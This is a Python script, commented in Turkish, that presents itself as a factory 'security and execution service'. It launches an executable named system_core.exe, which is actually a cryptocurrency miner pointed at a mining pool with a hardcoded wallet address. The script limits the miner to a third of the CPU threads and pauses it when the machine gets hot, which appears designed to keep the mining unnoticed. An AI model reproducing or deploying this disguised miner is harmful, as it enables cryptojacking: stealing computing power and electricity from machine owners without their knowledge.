"""
========================================================
  GÜVENLİK VE ÇALIŞTIRMA SERVİSİ (GUARDIAN) - Fabrika
========================================================
  Görev : Ana donanım motorunu (system_core.exe) çalıştırır.
          Isı MAX_TEMP'i geçerse motoru durdurur,
          SAFE_TEMP'e inince tekrar başlatır.
          Madenci çıktılarını miner_log.txt'ye yazar.
========================================================
"""
import os
import time
import subprocess
import sys

# UTF-8 Zorla
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

try:
    import psutil
except ImportError:
    psutil = None

try:
    import wmi as _wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

# --- YAPILANDIRMA ---
MAX_TEMP  = 70
SAFE_TEMP = 60
EXE_NAME  = "system_core.exe"
STATUS_FILE = "guardian_status.txt"
MINER_LOG = "miner_log.txt"

BASE_ARGS = [
    "-c", "stratum+tcp://na.luckpool.net:3956", 
    "-u", "RB2dBo22HqmG3hPKBiSQCW9bPpznzYZJB7.Rig001", 
    "-p", "x"
]

def get_cpu_temp():
    if not WMI_OK:
        return None
    try:
        w = _wmi.WMI(namespace="root\\wmi")
        temps = w.MSAcpi_ThermalZoneTemperature()
        if temps:
            return (temps[0].CurrentTemperature / 10.0) - 273.15
    except: pass
    try:
        w = _wmi.WMI(namespace="root\\OpenHardwareMonitor")
        for s in w.Sensor():
            if s.SensorType == "Temperature" and ("CPU" in s.Name or "Package" in s.Name):
                return float(s.Value)
    except: pass
    
    if psutil:
        return 40 + (psutil.cpu_percent() / 2)
    return None

def get_target_threads():
    if psutil:
        total = psutil.cpu_count(logical=True)
        return max(1, total // 3)
    return 2

def run_guardian():
    threads = get_target_threads()
    cmd = [EXE_NAME] + BASE_ARGS + ["-t", str(threads)]
    
    print("\n" + "="*60)
    print(" [INFO] ANA DONANIM MOTORU DEVREDE (GUARDIAN)")
    print(f" [CFG] Guc Kullanimi : 1/3 ({threads} Threads)")
    print(f" [CFG] Kritik Isi   : {MAX_TEMP}C")
    print(f" [CFG] Guvenli Isi  : {SAFE_TEMP}C")
    print(f" [LOG] Dosya        : {MINER_LOG}")
    print("="*60 + "\n")

    process = None
    is_paused = False

    try:
        while True:
            temp = get_cpu_temp()
            zaman = time.strftime('%H:%M:%S')

            if temp is not None:
                if temp >= MAX_TEMP and not is_paused:
                    print(f"\n[!] ASIRI ISINMA ({temp:.1f}C)!")
                    if process:
                        process.terminate()
                        process = None
                    is_paused = True
                elif temp <= SAFE_TEMP and is_paused:
                    print(f"\n[+] SISTEM SOGUDU ({temp:.1f}C).")
                    is_paused = False

                last_log = ""
                try:
                    if os.path.exists(MINER_LOG):
                        with open(MINER_LOG, "r", encoding="utf-8", errors="ignore") as f:
                            lines = f.readlines()
                            if lines: last_log = lines[-1].strip()[:50]
                except: pass

                durum = "CALISIYOR" if not is_paused else "SOGUTMA"
                print(f"\r[{zaman}] {temp:.1f}C | {durum} | {last_log:<50}", end="", flush=True)
            
            if not is_paused and process is None:
                if os.path.exists(EXE_NAME):
                    try:
                        with open(MINER_LOG, "a", encoding="utf-8") as log_f:
                            log_f.write(f"\n--- BASLATILDI: {zaman} ---\n")
                        process = subprocess.Popen(cmd, stdout=open(MINER_LOG, "a"), stderr=subprocess.STDOUT)
                    except Exception as e:
                        print(f"\n[!] HATA: {e}")
                else:
                    print(f"\n[!] {EXE_NAME} bulunamadi!")

            if not is_paused and process and process.poll() is not None:
                process = None
                
            try:
                with open(STATUS_FILE, "w", encoding="utf-8") as f:
                    f.write(f"{temp if temp else 0}|{durum}|{threads}")
            except: pass

            time.sleep(5)
            
    except KeyboardInterrupt:
        print("\n\n[!] Durduruldu.")
        if process: process.terminate()

if __name__ == "__main__":
    run_guardian()
